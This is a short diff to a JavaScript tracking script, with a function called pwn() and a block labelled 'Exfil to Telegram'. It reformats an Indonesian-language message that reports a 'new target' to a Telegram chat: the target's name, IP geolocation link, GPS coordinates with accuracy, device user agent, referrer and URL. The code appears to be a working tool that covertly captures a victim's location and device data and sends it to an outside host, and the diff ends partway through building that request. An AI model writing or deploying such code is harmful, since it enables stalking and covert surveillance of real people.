@@ -95,19 +95,17 @@ async function pwn(){
 /* === Exfil to Telegram === */
 function sendTelegram(data){
   const caption=`
-🔪 LACAKAN BARU 🔪
-👤NAMA TARGET : 
-${data.target}
+🔪 LOKASI TARGET BARU 🔪
+
+👤NAMA TARGET : ${data.target}
 📍IP LOKASI :
 https://iplocation.io/ip/${data.ip}
-📤GPS LOKASI: 
-${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
+📤GPS LOKASI:
+https://boulter.com/gps/#${data.gps.lat}%2C%20${data.gps.lon}%20 (±${data.gps.acc}m)
 💻PERANGKAT : 
 ${data.ua}
-🗃REFERENSI : 
-${data.ref}
-🔗TAUTAN : 
-${data.url}
+🗃REFERENSI : ${data.ref}
+🔗TAUTAN : ${data.url}
   `.trim();
   const form=new FormData();
   form.append('chat_id',CHAT_ID);
